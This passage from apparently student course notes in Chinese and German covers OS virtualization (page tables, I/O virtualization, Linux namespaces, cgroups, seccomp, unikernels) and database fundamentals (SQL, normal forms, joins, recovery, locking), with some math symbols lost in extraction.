无害指令（Innocuous Instructions）： 不属于前2类的则都属于这类。 虚拟化需要确保其中的敏感指令（Sensitive Instructions）必须是特权指令（Privileged Instructions）的子集。 反例可以参考x86架构中的POPF 指令（从栈加载标志寄存器 Flags）。 内存虚拟化（Speicher-Virtualisierung）在正常的非虚拟化情况下，操作系统（OS） 会直接管理物理内存并分配给不同的进程，利用前面学到的Seitentabelle(Page Table)。但在虚拟化的情况下，Hypervisor 需要作为最高管理者（übergeordnete Instanz）负责内存资源分配，确保Gast-BS不能随意访问物理内存且只能“看到”分配给它的部分。 下面介绍内存虚拟化的2中方法： 影子页表（Shadow Page Table, SPT） 硬件辅助的二级地址转换（Second Level Address Translation, SLAT） 影子页表（Shadow Page Table, SPT）在这个方法里一共存在三个内存抽象层： 物理内存 （Host-Physische Adressen, HPA） Hypervisor 对物理内存的抽象 即分配给Gast-BS的内存 （Gast-Physische Adressen）。这些内存对于Gast-BS来说是连续的，但是在实际的物理内存里不一定连续。 虚拟内存（ Virtueller Speicher） Guest OS 维护自己的页表（这些页表 不会 被 MMU（内存管理单元） 直接使用。），而Hypervisor维护影子页表（SPT）。为了保持页表的同步，Gast-BS只能以只读（Read-Only）方式访问它的页表，任何写入页表的尝试都会被 Hypervisor 拦截（Trap），让Hypervisor好更新Gast-BS的页表与SPT。 相当于影子页表是中间的那层页表。 SPT的问题也很显而易见：管理起来非常复杂而且开销很高（hoher Overhead）。 二级地址转换（Second Level Address Translation, SLAT）SLAT 由 CPU 提供硬件支持，将Gast-BS看到的 Gast 物理地址 (Gast-Physische Adressen) 映射到主机物理地址 (HPA)。Hypervisor 仅在 Guest OS 访问未映射的地址时才介入，减少性能开销。 例子： Intel Extended Page Tables (EPT), AMD Nested Page Tables (NPT) 虚拟机的内存管理跟进程管理的内存分配问题类似，我们也需要考虑该给每台虚拟机分配多少内存。 静态分配会导致不灵活，占用固定资源的问题。 动态分配的原理则是过量分配（Overcommitment）（假设并非所有 VMs 同时需要全部已分配的内存。）但这样会在回收已分配的内存时碰到问题，因为Hypervisor 无法知道哪些内存页是重要的，哪些可以释放。 为了解决这个问题我们可以使用 Ballooning (“balloon driver”)：Gast-BS内部的软件与Hypervisor进行通信：（没有内存压力的虚拟机）释放内存（“气球放气”）；申请内存（”给气球充气“）。 I/O 虚拟化（I/O-Virtualisierung）介绍几种I/O 虚拟化的技术： 完整虚拟化/仿真（Full Virtualization/Emulation）Hypervisor管理所有 Guest VM 的I/O请求，调度I/O资源。 Hypervisor 通过软件多路复用（multiplext）或仿真（emuliert）I/O 设备。 Hypervisor会拦截Guest VM的I/O请求，并将其转发到物理 I/O 设备。 优势： 高效 Gemultiplexte I/O-Geräte sind effizient； 透明 Transparentes Geräte-Management。 问题： 实现起来太复杂； Hypervisor 需要为多种 I/O 设备提供驱动程序。； 如果 I/O 设备完全仿真（Emulation），会产生较高的性能开销（Overhead）。 半虚拟化（Paravirtualization）将 I/O 设备驱动分为两部分 使用拆分驱动架构（Split-Driver-Architektur） 后端驱动（Backend-Treiber）：运行在 Hypervisor 或 I/O 处理 VM 内，实际管理物理设备。 前端驱动（Frontend-Treiber）：运行在 Gast-BS 内，与后端驱动通信。 优势： 开销更低（Geringer Overhead）； 更容易实现； Guest OS 适配更灵活，可以通过 已有驱动支持新设备。 问题： Guest OS 需要额外修改或安装特定驱动。 设备域（Device Domains）一台VM充当所有I/O设备的接口（在Xen中称为Domain 0或”dom0”），其他VMs通过这台VM访问I/O设备，而不是直接访问硬件。 直接 I/O 访问（Direct I/O）使用硬件支持的 I/O 设备多路复用（Multiplexing）。 I/O-MMU（I/O 内存管理单元） 负责管理 Guest VM 的设备内存： 负责 I/O 地址和中断（Interrupt）的映射。 隔离 DMA（直接内存访问）请求，防止 VMs 互相干扰。 优势： Guest VM 直接访问物理设备，提高 I/O 效率。 部分 I/O 处理由硬件完成，减少 Hypervisor 负担。 单根 I/O 虚拟化（Single Root I/O Virtualization, SR-IOV）I/O 设备本身支持虚拟化，将 一个物理设备拆分为多个虚拟功能（ Virtual Functions，VF），会绕过Hypervisor的I/O处理。 Gast VM 看到的是一个独立的 I/O 设备，但实际上它共享了同一个物理设备。 （感觉大部分虚拟化的技术都是通过减轻Hypervisor的负担来提高效率的） 进程虚拟机（Process Virtual Machines）跟系统虚拟机不同的是，进程虚拟机（Process VM）只给单个（或者多个）进程提供虚拟运行环境，使应用程序可以独立于底层操作系统和硬件架构运行。 Runtime会给用户空间进程（User-Space-Prozesse）提供虚拟运行环境，并且负责实现 ABI接口（由系统调用接口（Systemcall Interface）和用户指令集架构（User-ISA）组成）。简单来讲就是Runtime需要负责转换/翻译Systemcall和ISA的指令。 对应用程序来说，整个“系统”由 ABI 接口决定，而不依赖底层硬件或操作系统。 Runtime是类似于Hypervisor的中间层，但他们的核心作用之类的完全不一样。 进程虚拟机的优势： 仿真（Emulation）：程序可以在不同 ISA（指令集架构）上运行。 平台无关性（Plattform-Unabhängigkeit）：程序可以在不同 OS 运行。 性能优化（Performance-Optimierung）：二进制优化器（Binary Optimizer）会优化代码。 高级语言虚拟机（High-Level-Language VMs, HLL VMs）作为进程虚拟机的一种，会提供一个与底层架构无关的虚拟 ISA（ Plattform-unabhängige virtuelle ISA），使得应用程序不依赖特定的操作系统（OS）和硬件架构。主要是为了运行高级编程语言的代码。 比如说 Java Virtual Machine (JVM) 可以解释和执行 Java 字节码（Java Bytecode），让 Java 代码可以在 Windows、Linux、Mac 等不同平台 上运行。 如果多个进程需要共享资源并相互交互（interagieren），则通常使用操作系统级虚拟化（OS-level Virtualization）。 操作系统级虚拟化（OS-level-Virtualization）操作系统级虚拟化（OS-level-Virtualization）可以运行多个隔离的应用进程，共享同一个操作系统（OS）。 Container Leichtgewichtige Virtualisierungsmöglichkeit 轻量化 stellen eine Laufzeitumgebung für User-Space-Prozesse bereit BS wird nicht virtualisiert Isolation von Prozessen möglich Container是OS-Level Virtualization的一种实现。 在传统的 Unix 操作系统中，一些资源是全局管理的，比如说PID, UID (User ID), IP-Addresse, Host- und NIS-Domainnamen，使得具有 root 权限的进程可以访问和影响其他进程，带来安全隐患。所以希望将他们隔离开。 Namespaces 是 Container 的基础：抽象出对系统全局资源的访问 （比如说Filesystem-Mount-Points, Netzressourcen, PIDs, etc.），将所有进程拆成disjoint subsets，使得每个subset里的进程会认为自己是整个系统中唯一的进程。 Jede Ressource ist eindeutig innerhalb eines Namespace-Containers Bestandteile von Container unter LinuxNamespaces作用：Benennung und Adressierung von Ressourcen，实现进程级别的资源隔离。 主要负责隔离。 在实际应用中，我们不总是需要隔离所有系统资源。因此，Linux 提供了多个独立的 Namespace，以实现更灵活的隔离方式，并避免不必要的资源浪费： UTS: Unix Time Sharing (System) Isolieren System-Identifier (z.B.Host- und Domainnamen 主机名和域名) 例如，在 Docker 容器中，每个容器可以拥有自己的主机名，而不会影响宿主机。 IPC: Inter-Process Communication isolieren IPC-Ressourcen 隔离进程间通信、 例如，不同的容器不能访问彼此的共享内存和消息队列，提高安全性。 Network: isolieren Netzressourcen 隔离网络设备、IP 地址、端口、路由表等，允许不同 Namespace 拥有独立的网络栈。 PID: isolieren PID-Räume Prozesse in unterschiedlichen PID-Namespaces können dieselbe PID haben, aber eindeutig innerhalb eines PID-Namespace Es können verschachtelte (engl. nested) PID-Namespaces erstellt werden 可以套娃 在同一 PID 命名空间内，进程可以正常通信；在不同 PID 命名空间之间，父 Namespace 可以向子 Namespace 发送信号，但子 Namespace 不能影响父 Namespace。 Mount: isolieren Mount-Points des Dateisystems 隔离文件系统挂载点，允许不同的 Namespace 看到不同的文件系统视图。 （在 Linux 中，挂载点（Mount Point） 是指将一个文件系统连接到目录结构中的特定位置，使其内容可以通过该目录访问。） 挂载类型 (Mount-Typ)： Shared Mount 共享挂载：接收+传递 该挂载点的 mount 和 umount 事件会在 Peer Group 之间传播。 例如，在 Shared Mount 上挂载一个新目录，所有共享该挂载点的进程都会看到这个变更。 Private Mount 私有挂载：不接收+不传递 挂载点不会接收，也不会向对等组（Peer Groups）传递事件。 Der Mount-Point empfängt und leitet keine Events zu Peer Groups weiter. Slave Mount 从属挂载：接收+不传递 Slave-Mount-Points empfangen Events von einer Master Peer Group. Unbinable Mount 不可绑定挂载： Ist ein Private Mount, der nicht gebunden (Bind Mount) werden kann. 不能被绑定的私人挂载。 (Bind Mount指的是允许将一个目录或文件挂载到另一个位置，使其在多个路径下可见。) Peer Groups（对等组）：Peer Group 是一组共享 mount 事件的挂载点，当一个 Shared Mount 被创建时，它会被添加到某个 Peer Group。所有 Peer Group 内的挂载点都会同步 mount 和 umount 事件。 User: isolieren User- und Group-IDs 隔离用户 ID 和权限 Erhöhte Privilegien sind nur innerhalb des User Namespace gültig. können auch verschachtelte User-Namespaces erstellt werden. 套娃 例如，容器内的 root 实际上是宿主机的普通用户，增强安全性。 Linux Control Groups (cgroups)主要负责限制。 作用： cgroups unterteilen Prozesse in hierarchische Gruppen 将进程划分为层次化的组 分配( Allozieren )和分发( verteilen )每一组的系统资源 （CPU, 内存等） 资源由独立的 cgroup 子系统表示 Jedes Subsystem verwaltet eine Hierarchie an Prozessgruppen Accounting Überwacht Seiten, die von den Prozessgruppen verwendet werden 监控进程使用的内存 Kontrolle weiche Speichergrenzen 确保内存页会被回收（但不是强制的，即在系统压力下会优先释放，但不会立即强制回收） harte Speichergrenzen 会触发 Out-of-Memory-Killer 所有该 cgroup 内的进程会被冻结。 OOM Killer 可能会终止进程或调整内存限制。 如果内存使用量下降到限制以下，进程可以恢复运行。 Secure Computing Mode (Seccomp)用于限制进程可以执行的系统调用（System Calls）。 提供 3 种模式： Disabled： 未启用，可以调用所有 System Call Strict： 只能调用4个：read(), write(), exit() 和 sigreturn() （sigreturn() 是一个 系统调用（syscall），用于 从信号处理程序（signal handler）返回到被中断的进程上下文。） 调用其他的会触发SIGKILL信号。 Filter： 只能使用被过滤过的System Call。 Filter会基于Berkeley Packet Filter (BPF)。 库操作系统（Library OS）其实虚拟机（VM）和Container还是有些问题的： 通用性（Universell）：内核（Kernel）并未针对特定应用进行优化。 额外开销（Overhead）：包含未使用的组件，带来以下问题： 镜像（Abbilder，指的是 VM 或容器的系统镜像（System Image），包含操作系统和应用程序的文件。）过大会导致部署（Deployment，指的是 将 VM 或容器的镜像部署到运行环境中的过程。）变慢。 攻击面（Angriffsfenster）过大，增加安全风险。 容器通常只为一个用户提供一个应用，所以包含许多不必要的功能。 所以我们可以考虑将 VM 作为一个应用进行编译（即 Library OS），用于创建一个最小化、专门针对特定应用优化的虚拟机。 Library OS 会像一个库（Bibliothek）一样运行。在编译过程中，仅包含所需的功能，整个系统可以通过编译器进行优化。一般只会运行一个进程（但支持多线程）。 Library OS 的理念可以理解为：将每个应用程序所依赖的 OS(操作系统) 的 personality(特性) 作为 library(库) ，使其独立地运行在该应用程序的地址空间上。 这种VM 被称为 Unikernel，意味着所有执行都在内核模式（Kernel Mode）进行，并且只有一个地址空间，因为整个 Unikernel 就是一个单进程应用。 缺点：应用程序必须经常进行调整（angepasset werden），因为它们在内部调用其他应用程序，但架构不支持这种调用。核心原因就是不支持多个进程交互。 例题例题1Wie viele PIDs hat ein Prozess unter Linux? Eine pro User Eine pro CPU Eine pro cgroup Eine pro Child Eine pro Prozessgruppe Eine pro PID-Namespace 答案：6。 例题2 Welche Voraussetzungen müssen für hardware-unterstützte Virtualisierung erfüllt sein? Gast kooperiert mit Host-Betriebssystem Syscall-Nummern im Gast- und Host-Kernelsind identisch Gast- und Host-ISA sind identisch Support durch Prozessor Peripheriegeräte unterstützen SR-IOV Gast-Adressen entsprechen Host-Adressen 答案：3，4. 解释：","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/en/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://archer-baiyi.github.io/en/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://archer-baiyi.github.io/en/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/en/tags/container/"}]},{"title":"GBS-1-Einführung","slug":"TUM info 笔记/GBS/GBS-1-Einführung","date":"2025-03-11T17:15:25.000Z","updated":"2025-04-26T18:30:40.720Z","comments":true,"path":"2025/03/11/TUM info 笔记/GBS/GBS-1-Einführung/","permalink":"https://archer-baiyi.github.io/en/2025/03/11/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-1-Einf%C3%BChrung/","excerpt":"操作系统基础相关笔记","text":"Grundlagen: Betriebssysteme und SystemsoftwareAufgabe der Informatik:","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/en/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Datenbank 笔记","slug":"TUM info 笔记/Datenbank/Datenbank-笔记","date":"2025-03-11T10:37:03.000Z","updated":"2025-04-26T18:30:10.148Z","comments":true,"path":"2025/03/11/TUM info 笔记/Datenbank/Datenbank-笔记/","permalink":"https://archer-baiyi.github.io/en/2025/03/11/TUM%20info%20%E7%AC%94%E8%AE%B0/Datenbank/Datenbank-%E7%AC%94%E8%AE%B0/","excerpt":"数据库基础相关笔记","text":"1. Datenbankentwurf / ER-ModellierungEntity-relationship diagram Funktionalitäten: 1:1, 1:N, N:1, N:M Min-Max: (min,max) Multiplizität 2. Das Relationale ModellSchlüssel, Primärschlüssel Relationen mit gleichem Schlüssel kann man zusammenfassen. Anomalie: 异常 Die Relationale Algebra Selektion Projektion (会自动去重) Kreuzprodukt Join (Verbund) Umbenennung Mengendifferenz Division Vereinigung Mengendurchschnitt Semi-Join (linkes Argument wird gefiltert) (筛选左表，仅保留在右表中有匹配记录的左表行。) Semi-Join (rechtes Argument wird gefiltert) Anti-Semi-join ⟕ linker äußerer Join (会保留左表中的所有记录，即使在右表中没有匹配的记录时，右表对应的位置会以 NULL 填充。) ⟖ rechter äußerer Join ⟗ (voller) äußerer Join Der Relationenkalkül (relationaler Tupelkalkül) Bsp.: Der Domänenkalkül Bsp.: ü Diese 3 Sprachen sind gleich mächtig 3. SQLstandadisierte -Datendefinitions (DDL)- -Datenmanipulations (DML)- -Anfrage (Query)-Sprache Datendefinition (DDL)Datentypen: character(n), char(n) character varying(n), varchar(n) numeric(p,s), integer, decimal p（precision，精度）：数值的总位数（包含小数点前后的所有数字）。 s（scale，小数位数）：小数部分的位数（小数点后的位数）。 blob oder raw – für sehr große binäre Daten clob – für sehr große String-Attribute date – für Datumsangaben xml – für XML-Dokumente 1234create table Professoren ( PersNr integer not null, Name varchar(30) not null, Rang character(2)); DatenmanipulationEinfügen von Tupeln 1234insert into hörenselect MatrNr, VorlNrfrom Studenten, Vorlesungenwhere Titel = 'Logik'; 12insert into Studenten (MatrNr, Name)values (28121, 'Archimedes'); Löschen von Tupeln 12delete Studentenwhere Semester &gt; 13; Verändern von Tupeln 12update Studentenset Semester = Semester + 1; Anfrage123select (distinct) asfromwhere and Sortieren: 123select PersNr, Name, Rangfrom Professorenorder by Rang desc, Name asc; Mengenoperation: 1union, intersect, minus 12345selectfromwhere (not) exists (select from where)where not in () 比较： 1(where) value &gt;= ALL(子查询) Aggregationsfunktion: 1avg, max, min, count, sum Gruppierung: 1234selectfrom(where)group by Alle in der select-Klausel aufgeführten Attribute - außer den aggregierten - auch in der group by-Klausel aufgeführt werden. 比如说下面这里的gelesenVon, Name： 12345select gelesenVon, Name, sum(SWS)from Vorlesungen, Professorenwhere gelesenVon = PersNr and Rang = 'C4'group by gelesenVon, Name having avg(SWS) &gt;=3; Casting: 12cast(expression AS target_data_type)cast(h.AnzProVorl as decimal(6,2)) Allquantor und Implikation: ( \\forall t \\in R \\ (P(t)) ) \\Leftrightarrow ( \\neg (\\exists t \\in R \\ (\\neg P(t))) )(R \\Rightarrow T) \\Leftrightarrow (\\neg R \\lor T)Auswertung bei NULL-Werten and, between, in (1,2,3,4) like mit Platzhalter: “%” (für beliebig biele Zeichen) “_” (für genau ein Zeichen) case left/right/full outer join Rekursion Vorgänger des „Wiener Kreises“ der Tiefe n: 1234567891011select v1.Vorgängerfrom voraussetzen v1, ... voraussetzen vn_minus_1, voraussetzen vn, Vorlesungen vwhere v1.Nachfolger = v2.Vorgänger and ... vn_minus_1.Nachfolger = vn.Vorgänger and vn.Nachfolger = v.VorlNr and v.Titel = 'Der Wiener Kreis'; Mit Rekursion: 123456789101112131415161718192021with recursive TransVorl (Vorg, Nachf) as ( -- 递归的基础查询（初始层级） select Vorgänger, Nachfolger from voraussetzen union all -- 递归部分（从前一层继续查找更深的层级） select t.Vorg, v.Nachfolger from TransVorl t, voraussetzen v where t.Nachf = v.Vorgänger)select Titel from Vorlesungen where VorlNr in ( select Vorg from TransVorl where Nachf in ( select VorlNr from Vorlesungen where Titel = 'Der Wiener Kreis' )); 4. DatenintegritätIntegritätsbedingungen: -Schlüssel -Beziehungskardinalitäten -Attributdomänen -Inklusion bei Generalisierung Referentielle Integrität Fremdschlüssel Änderung von referenzierten Daten: Default 会拒绝执行主键的更改操作 cascade (Kaskadieren): 级联，外键会随着主键的更改一起更改 set NULL Statische Integritätsbedingungen: 12create table Studenten(Semester integer check Semester between 1 and 13) 12create table Prof(Rang character(2) check(Rang in ('C2','C3','C4'))) Konsistenzbedingung: 1234567create table prüfen(MatrNr ···VorNr ···Note ···primary key (MatrNr,VorNr))constraint VorherHören check (···) Trigger: 123456789101112131415161718192021-- 1. create trigger keine Degradierung-- 2.before update on Professorenfor each row-- 3.when (old.Rang is not null)begin-- 4. if :old.Rang = 'C3' and :new.Rang = 'C2' then :new.Rang := 'C3'; end if; if :old.Rang = 'C4' then :new.Rang := 'C4'; end if; if :new.Rang is null then :new.Rang := :old.Rang; end if;end; create trigger Anweisung, gefolgt von einem Namen, der Definition des Auslösers, in diesem Fall bevor eine Änderungsoperation (before update on) auf einer Zeile (for each row) der Tabelle Professoren ausgeführt werden kann, einer einschränkenden Bedingung (when) und einer Prozedurdefinition in der Oracle-proprietären Syntax. Temporale Daten 5. Relationale EntwurfstheorieFunktionale AbhängigkeitenFunctional Dependency (FD) A B C D a4 b2 c4 d3 a1 b1 c1 d1 a1 b1 c1 d2 a2 b2 c3 d2 a3 b2 c4 d3 R:= {A,B,C,D} 假设 : (可以理解成函数的 rechtseindeutig) Super-Schlüssel : ( 生成元) voll funktional abhängig von () : kann nicht mehr verkleinert werden () Kandidaten-Schlüssel: ( 最小生成元) Armstrong-Axiome FD-Hülle einer Attributmenge Kanonische Überdeckung 没有冗余的属性(Attribute)和依赖(Abhängigkeit) Berechnung: 消除右部冗余属性 (, 时仅保留 和 ) 消除左部冗余属性 删除冗余的函数依赖 (，， 时仅保留 和 ) R = R1 R2 2 Korrektheitskriterien für die Zerlegung von Relationenschemata: Verlustlosigkeit Abhängigkeitserhaltung verlustlose Zerlegung: ( R = R1 R2 ) Hinreichende Bedingung für die Verlustlosigkeit einer Zerlegung: oder NormalformenErste Normalform (1NF): Nur atomare Domäne. 都要是singleton，不能出现集合或者重复行 反例： Vater Mutter Kinder Johann Martha {Else, Lucie} Johann Maria {Theo, Josef} Heinz Martha {Cleo} 正例： Vater Mutter Kind Johann Martha Else Johann Martha Lucie Johann Maria Theo Johann Maria Josef Heinz Martha Cleo Zweite Normalform (2NF)： falls jedes Nicht(kandidat)schlüssel-Attribut voll funktional abhängig ist von jedem Kandidatenschlüssel der Relation. 假设R:= {A,B,C,D}的Kandidaten-Schlüssel是{A,B},那么需要满足C,D sind voll funktional abhängig von {A,B}。 只要出现类似{A} {C}之类的就不行了。 可以理解成不能有多余列。 Remark: 如果Kandidaten-Schlüssel只有一个元素，那么一定满足2NF。 反例（1非2）： A B C x a 1 x b 1 y c 2 {A,B}为Kandidaten-Schlüssel。有{A} {C}。 Dritte Normalform (3NF)： wenn für jede für geltende funktionale Abhängigkeit der Form mit und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial Das Attribut ist in einem Kandidatenschlüssel von enthalten – also ist prim ist Superschlüssel von 假如{A,B}是Kandidatenschlüssel，那么可以{C,D} {A}是符合第二条要求的。（但是这个不满足后面的BCNF） 反例（2非3）： A B C D x a 1 n x b 2 m y c 2 m 满足{A,B} {C}， {A,B} {D} voll，所以满足2NF； 有{C} {D}，所以不满足3NF。 Synthesealgorighmus: zerlegen R in R1,…,Rn, sodass: R1,…,Rn verlustlos R1,…,Rn abhägigkeitserhaltend Alle R1,…,Rn in 3NF Boyce-Codd-Normalform (BCNF)： wenn für jede für geltende funktionale Abhängigkeit der Form (FDs) und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial ist Superschlüssel von 反例（3非BCNF）： A B C D x a 1 1 x b 2 1 y a 3 2 y b 2 1 有 AB CD C B 因为B属于Kandidatschlüssel，所以满足3NF，但是不满足BCNF。 Man kann jede Relation verlustlos in BCNF-Relationen zerlegen, aber nicht unbedingt abhägigkeitserhaltend. Dekompositions-Algorithmus Mehrwertige Abhägigkeit (Multivalued Dependency, MVD): 2行对上，2行交叉对应 Jede FD is auch eine MVD: Eine MVD ist trivial iff: oder Vierte Normalform (4NF): falls für jede MVD eine der folgenden gilt: Die MVD ist trivial oder ist Superschlüssel von R 6. Physische DatenorganisationSpeicherhierarchieRegister Cache Hauptspeicher Plattenspeicher Archivspeicher RAIDRedundant Arrays of Independent Disks MTTF, MTTR, MTTDL RAID 0: Striping RAID 1: Spiegelung RAID 0+1(10): Striping und Spiegelung RAID 2: Striping auf Bit-Ebene RAID 3: Striping auf Bit-Ebene mit Paritätsinfo RAID 4: Striping von Blöcken RAID 5: Striping von Blöcken, Verteilung der Paritätsblöcke IndexstrukturenB-BäumeB+-BäumeErweiterbares HashingDynamisches Wachsen möglich Beispiel: gespiegelte binäre PersNr h(004) = 00100000… (4=0…0100) h(006) = 01100000… (6=0…0110) h(048) = 00001100… (48=0…0110000) Globale Tiefe Lokale Tiefe R-Baummehrdimensionalen Zugriffsstrukturen 7. AnfragebearbeitungLogische OptimierungKanonische Übersetzung: SQL Relationale Algebra Äquivalenzerhaltende Transformationsregeln 一共12条 Dependent Join Physische OptimierungNested Loop Joinforeach : ​ foreach : ​ if s.a=r.a then Res:= Res (r s) O(N*M) Block-Nested Loop Algorithmusforeach Block ​ foreach ​ foreach ​ if s.b = r.a then Res:= Res (r s) O(N * M/B) (M/B: Anzahl der Blöcke) Index-JoinVoraussetzung: 其中一个表是sortiert的且有B-Baum O(N * log(M)) Merge-JoinVoraus.: 2个表都是sortiert的 O(N+M) linear Hash-Join选定一个哈希函数h()，计算R.A的值，分配到hash buckets里，然后再计算S.B的值，在哈希桶里匹配。 不需要预先排序 Partitionieren und Hashing的话需要2个哈希函数。 O(N+M) linear Join mit Hashfilter (Bloom-Filter)需要很多个（k个）不同的哈希函数forall : 计算h_i(a) forall 0覆盖1。 会出现False Positive，但是不会出现False Negative Externes SortierenSelektivität Dynamische Programmierung: Phase: Zugriffspläne ermitteln Phase: Join-Pläne ermittel (2-fach, …, n-fach) Phase: Finalisierung 8. TransaktionsverwaltungBegin of Transaction (BOT)：转账开始的标志 read：读存款 write：写入（修改存款，出账入账） commit：转账结束，所有操作festschreiben abort：取消转账，所有状态复原 define savepoint backup transaction: Auf den jüngsten Sicherungspunkt zurücksetzen. commit work rollback work: Alle Änderungen sollen zurückgesetzt werden. ACID: Atomicity (Atomarität)：原子性。 Alles oder Nichts. Consistency：一致性。 Isolation：隔离性。 Durability (Dauerhaftigkeit)：持久性。 所有更改都必须永久存储。Änderungen erfolgreicher Transaktionen dürfen nie verloren gehen. 9. Fehlerbehandlung (Recovery)Fehlerklassifikation Lokaler Fhler in einer noch nicht festgeschriebenen Transaktion Wirkung zurücksetztenR1-Recovery Fehler mit Hauptspeicherverlust Abgeschlossene TAs erhalten bleiben R2-Recovery redo Noch nicht abgeschlossene TAs zurücksetzten R3-Recovery undo Fehler mit Hintergrundspeicherverlust R4-Recovery steal：未提交的事务修改的页面不会被替换。 steal：允许替换缓存中的任何非固定页面。 force：事务提交时立即将数据写入磁盘。 force：修改的数据仍可保留在缓存中，提高性能。 Auswirkung auf Recovery: force force steal - Kein Undo- Kein Redo - Kein Undo- Redo steal - Undo- Kein Redo - Undo- Redo Einbringungsstrategie（数据提交策略）: Update in Place：直接覆盖 Twin-Block-Verfahren：复制整个数据块 Schattenspeicherkonzept：复制修改的页面 Log-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo：纪录当前操作（比如说+=50） Undo：当前操作的逆向（比如-=50） PrevLSN：上一个日志记录的指针 [LSN, TransaktionsID, PageID, Redo, Undo, PrevLSN] （中括号） Protokollierung: Physische Protokollierung before-image：修改前的Zustand after-image Logische Protokollierung Undo-Code Redo-Code Log-Information会记录2次以上： Log-Datei R1,R2,R3 Log-Archiv R4 WAL-Prinzip (Write Ahead Log)： Commit前，确保所有相关的日志记录已写入日志文件。 modifizierte Seite auslagern前，确保相关日志记录已写入日志存档（Log-Archiv）。 Winner：在崩溃前已经完成，需要Redo Loser：在崩溃时仍然处于未提交状态，需要Undo Wiederanlauf: Analyse Log-Datei analysieren Winner-Menge ermitteln Loser-Menge ermitteln Redo Undo CLR: Compensating Log Record 用于记录撤销的操作。（给undo的） 简单来说就是为了预防恢复崩溃时发生的其他崩溃。 CLR-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo： PrevLSN：上一个日志记录的指针 UndoNxtLSN：Verweis auf die nächste rückgängig zu machende Änderung （尖括号） 注意：CLR没有undo信息。 3种Sicherungspunkte(-Qualitäten)： transaktionskonsistent （事务一致） 所有已提交的事务都被完全存储，未提交的都没有被写入磁盘。（只在所有活跃事务完成后进行检查点记录） aktionskonsistent （操作一致） 可能包含未提交的事务，但是所有操作都是完整的。 unscharf (fuzzy) 修改的页面不会立即写入磁盘，只记录“脏页”的信息，而不是数据本身 DirtyPages (Menge der modifizierten Seiten, 尚未写入磁盘), MinDirtyPageLSN, MinLSN R4-Recovery 10. MehrbenutzersynchronisationFehler (bei unkontroliertem Mehrbenutzerbetrieb): Lost Update: Verlorengegangene Änderungen Dirty Read: Abhängigkeit von nicht freigegebenen Änderungen Phantomproblem HistorieSeiralisierbarkeit 2 Historien äquivalent: wenn sie die Konfliktoperationen der nicht abgebrochenen Transaktionen in derselben Reihenfolge ausführen. SR: Eine Historie ist serialisierbar wenn sie äquivalent zu einer seriellen Historie Hs ist. Eine Historie H serialisierbar der zugehörige Serialisierbarkeitsgraph SG(H) azyklisch ist. liest von in der Historie H RC: rücksetzbare Historie kaskadierendes Rücksetzen (Cascading Rollback)： 假如T2读取了T1里被修改过但是还未被提交（commit）的数据，那么当T1 abort的时候，也需要abort T2。 ACA: Historien ohne kaskadierendes Rücksetzen (avoiding cascading abort) ST: Strikte Historien 想要对一个被修改过的对象进行操作前，必须要确保其已经被commit或者abort了。 Sperrbasierte Synchronisation （锁）Sperrmodi: S (shared, read lock) 允许多个事务（Transaktion）同时读取数据，但不能进行写操作。 X (exclusive, write lock) 允许事务对数据进行读取和写入，但其他事务不能同时访问该数据。 Verträglichkeitsmatrix / Kompatibilitätsmatrix: NL S X S ✅（兼容） ✅ ❌ X ✅ ❌（不兼容） ❌ Zwei-Phasen-Sperrprotokoll: Wachstumsphase：只获取锁 Schrumpfphase：只释放锁 Strenges Zwei-Phasen-Sperrprotokoll: 所有锁直到事务提交（commit）或回滚（abort）后才释放，避免级联回滚。 Verklemmungen (Deadlocks) Erkennung: Wartegraph Vermeidung: Preclaiming durch Zeitstempel Wound-Wait Strategie Wait-Die Strategie Multi-Granularity Locking (MGL) Phantomproblem: Zugriffsweg sperren Zeitstempel-basierende SynchronisationreadTS(A)：上次读取 A的时间戳。 writeTS(A)：上次写入 A 的时间戳。 Synchronisationsverfahren: 当 Ti 试图读取数据 A (ri(A))： 若 TS(Ti)&lt;writeTS(A)，则 Ti必须被回滚（因为 AAA 可能已被更新）。 否则，Ti可以继续读取，并更新 readTS(A) = max(TS(Ti), readTS(A))。 当 Ti 试图写入数据 A (wi(A))： 若 TS(Ti)&lt;readTS(A)，说明在 Ti之前已经有其他事务读取了 A，则 